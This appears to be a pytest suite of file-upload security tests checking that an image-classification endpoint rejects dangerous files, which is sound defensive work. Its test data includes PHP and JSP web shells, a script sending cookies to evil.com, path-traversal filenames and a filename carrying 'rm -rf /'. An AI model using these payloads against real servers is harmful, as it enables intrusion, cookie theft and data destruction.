"""
File Upload Security Tests  —  FlavorSnap Issue #226

Covers:
  - Blocking server-side scripts (PHP, Python, shell)
  - Double-extension bypass attempts
  - MIME / magic-byte spoofing
  - SVG with embedded XSS
  - File size limits (DoS prevention)
  - Filename sanitisation
  - Unauthenticated upload rejection
"""
from __future__ import annotations

import io

import pytest
from PIL import Image


def _upload(
    client: object,
    file_bytes: bytes,
    filename: str,
    content_type: str,
    token: str,
) -> object:
    return client.post(  # type: ignore[attr-defined]
        "/api/classify",
        files={"file": (filename, io.BytesIO(file_bytes), content_type)},
        headers={"Authorization": f"Bearer {token}"},
    )


# ---------------------------------------------------------------------------
# Baseline — valid uploads must succeed
# ---------------------------------------------------------------------------

@pytest.mark.security
class TestAllowedUploads:
    """Legitimate images must be accepted (regression guard)."""

    def test_valid_jpeg_accepted(
        self, valid_jpeg_bytes: bytes, auth_token: str, test_client: object
    ) -> None:
        resp = _upload(test_client, valid_jpeg_bytes, "food.jpg", "image/jpeg", auth_token)
        assert resp.status_code in (200, 201), (  # type: ignore[attr-defined]
            "Valid JPEG upload rejected — upload pipeline broken"
        )

    def test_valid_png_accepted(
        self, valid_png_bytes: bytes, auth_token: str, test_client: object
    ) -> None:
        resp = _upload(test_client, valid_png_bytes, "food.png", "image/png", auth_token)
        assert resp.status_code in (200, 201)  # type: ignore[attr-defined]


# ---------------------------------------------------------------------------
# Blocked file types
# ---------------------------------------------------------------------------

@pytest.mark.security
class TestBlockedFileTypes:
    """Dangerous file types must be rejected regardless of content-type header."""

    @pytest.mark.parametrize("filename,content_type,payload", [
        ("shell.php",  "application/x-php",       b"<?php system($_GET['cmd']); ?>"),
        ("shell.php",  "image/jpeg",               b"<?php system($_GET['cmd']); ?>"),
        ("shell.py",   "text/x-python",            b"import os; os.system('id')"),
        ("shell.sh",   "application/x-sh",         b"#!/bin/bash\nid"),
        ("shell.exe",  "application/octet-stream", b"MZ\x90\x00"),
        ("shell.jsp",  "text/plain",               b"<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>"),
        ("shell.html", "text/html",                b"<script>fetch('//evil.com?c='+document.cookie)</script>"),
    ])
    def test_executable_file_rejected(
        self,
        filename: str,
        content_type: str,
        payload: bytes,
        auth_token: str,
        test_client: object,
    ) -> None:
        resp = _upload(test_client, payload, filename, content_type, auth_token)
        assert resp.status_code in (400, 415, 422), (  # type: ignore[attr-defined]
            f"Dangerous file accepted: {filename!r} ({content_type})"
        )


# ---------------------------------------------------------------------------
# Double-extension bypass
# ---------------------------------------------------------------------------

@pytest.mark.security
class TestDoubleExtensionBypass:
    """Double-extension filenames used to bypass naive extension checks must be rejected."""

    @pytest.mark.parametrize("filename", [
        "shell.php.jpg",
        "shell.php5.png",
        "shell.phtml.jpeg",
        "shell.php%00.jpg",
        "shell.PhP.jpg",
        "shell.php .jpg",
    ])
    def test_double_extension_rejected(
        self,
        filename: str,
        valid_jpeg_bytes: bytes,
        auth_token: str,
        test_client: object,
    ) -> None:
        resp = _upload(test_client, valid_jpeg_bytes, filename, "image/jpeg", auth_token)
        assert resp.status_code in (400, 415, 422), (  # type: ignore[attr-defined]
            f"Double-extension filename accepted: {filename!r}"
        )


# ---------------------------------------------------------------------------
# MIME / magic-byte spoofing
# ---------------------------------------------------------------------------

@pytest.mark.security
class TestMIMESpoofing:
    """Server must validate file content (magic bytes), not just headers."""

    def test_php_disguised_as_jpeg_rejected(
        self, php_webshell_bytes: bytes, auth_token: str, test_client: object
    ) -> None:
        resp = _upload(test_client, php_webshell_bytes, "food.jpg", "image/jpeg", auth_token)
        assert resp.status_code in (400, 415, 422), (  # type: ignore[attr-defined]
            "PHP webshell disguised as JPEG was accepted"
        )

    def test_polyglot_jpeg_php_rejected(
        self, polyglot_image_bytes: bytes, auth_token: str, test_client: object
    ) -> None:
        resp = _upload(
            test_client, polyglot_image_bytes, "food.jpg", "image/jpeg", auth_token
        )
        if resp.status_code in (200, 201):  # type: ignore[attr-defined]
            data = resp.json()  # type: ignore[attr-defined]
            stored_path = data.get("file_path", data.get("url", ""))
            if stored_path:
                fetch_resp = test_client.get(stored_path)  # type: ignore[attr-defined]
                assert "uid=" not in fetch_resp.text, (
                    "Polyglot JPEG/PHP stored and PHP portion was executed on retrieval"
                )

    def test_corrupted_image_rejected(
        self, corrupted_image_bytes: bytes, auth_token: str, test_client: object
    ) -> None:
        resp = _upload(
            test_client, corrupted_image_bytes, "food.png", "image/png", auth_token
        )
        assert resp.status_code in (400, 415, 422), (  # type: ignore[attr-defined]
            "Corrupted image bytes accepted — PIL validation not enforced"
        )


# ---------------------------------------------------------------------------
# SVG uploads
# ---------------------------------------------------------------------------

@pytest.mark.security
class TestSVGUpload:
    """SVG files carrying XSS payloads must be rejected."""

    def test_svg_with_script_tag_rejected(
        self, malicious_svg_bytes: bytes, auth_token: str, test_client: object
    ) -> None:
        resp = _upload(
            test_client, malicious_svg_bytes, "food.svg", "image/svg+xml", auth_token
        )
        assert resp.status_code in (400, 415, 422), (  # type: ignore[attr-defined]
            "SVG file with <script> tag accepted — stored XSS risk"
        )

    def test_svg_disguised_as_png_rejected(
        self, malicious_svg_bytes: bytes, auth_token: str, test_client: object
    ) -> None:
        resp = _upload(
            test_client, malicious_svg_bytes, "food.png", "image/png", auth_token
        )
        assert resp.status_code in (400, 415, 422), (  # type: ignore[attr-defined]
            "SVG disguised as PNG accepted — content sniffing not applied"
        )


# ---------------------------------------------------------------------------
# File size limits
# ---------------------------------------------------------------------------

@pytest.mark.security
class TestFileSizeLimits:
    """Uploads exceeding the size limit must be rejected with 413."""

    def test_oversized_image_rejected(
        self, oversized_image_bytes: bytes, auth_token: str, test_client: object
    ) -> None:
        resp = _upload(
            test_client, oversized_image_bytes, "large.png", "image/png", auth_token
        )
        assert resp.status_code in (400, 413), (  # type: ignore[attr-defined]
            "Oversized image accepted — upload size limit not enforced"
        )

    def test_zip_bomb_rejected(
        self, zip_bomb_bytes: bytes, auth_token: str, test_client: object
    ) -> None:
        resp = _upload(
            test_client, zip_bomb_bytes, "bomb.zip", "application/zip", auth_token
        )
        assert resp.status_code in (400, 413, 415), (  # type: ignore[attr-defined]
            "Zip bomb accepted — no compressed-size safeguard"
        )

    def test_empty_file_rejected(
        self, auth_token: str, test_client: object
    ) -> None:
        resp = _upload(test_client, b"", "empty.jpg", "image/jpeg", auth_token)
        assert resp.status_code in (400, 422), (  # type: ignore[attr-defined]
            "Empty file upload accepted"
        )


# ---------------------------------------------------------------------------
# Filename sanitisation
# ---------------------------------------------------------------------------

@pytest.mark.security
class TestFilenameSanitisation:
    """Dangerous filenames must be rejected or sanitised before storage."""

    @pytest.mark.parametrize("filename", [
        "../../../etc/cron.d/evil",
        "..\\..\\windows\\system32\\evil.dll",
        "/etc/passwd",
        "food\x00.jpg",
        "food; rm -rf /",
        "." * 256 + ".jpg",
        "con.jpg",
        "nul.jpg",
    ])
    def test_dangerous_filename_rejected_or_sanitised(
        self,
        filename: str,
        valid_jpeg_bytes: bytes,
        auth_token: str,
        test_client: object,
    ) -> None:
        resp = _upload(test_client, valid_jpeg_bytes, filename, "image/jpeg", auth_token)
        if resp.status_code in (200, 201):  # type: ignore[attr-defined]
            stored = resp.json().get("file_path", resp.json().get("filename", ""))  # type: ignore[attr-defined]
            assert "../" not in stored, (
                f"Path traversal preserved in stored filename: {stored!r}"
            )
            assert "\x00" not in stored, (
                f"Null byte preserved in stored filename: {stored!r}"
            )
        else:
            assert resp.status_code in (400, 415, 422)  # type: ignore[attr-defined]


# ---------------------------------------------------------------------------
# Unauthenticated upload
# ---------------------------------------------------------------------------

@pytest.mark.security
class TestUnauthenticatedUpload:
    """The upload endpoint must require a valid auth token."""

    def test_unauthenticated_upload_rejected(
        self, valid_jpeg_bytes: bytes, test_client: object
    ) -> None:
        resp = test_client.post(  # type: ignore[attr-defined]
            "/api/classify",
            files={"file": ("food.jpg", io.BytesIO(valid_jpeg_bytes), "image/jpeg")},
        )
        assert resp.status_code in (401, 403), (
            f"Upload accepted without authentication (status {resp.status_code})"  # type: ignore[attr-defined]
        )

    def test_invalid_token_upload_rejected(
        self, valid_jpeg_bytes: bytes, test_client: object
    ) -> None:
        resp = _upload(
            test_client, valid_jpeg_bytes, "food.jpg", "image/jpeg", token="invalid.token.here"
        )
        assert resp.status_code in (401, 403), (
            "Upload accepted with an invalid token"
        )
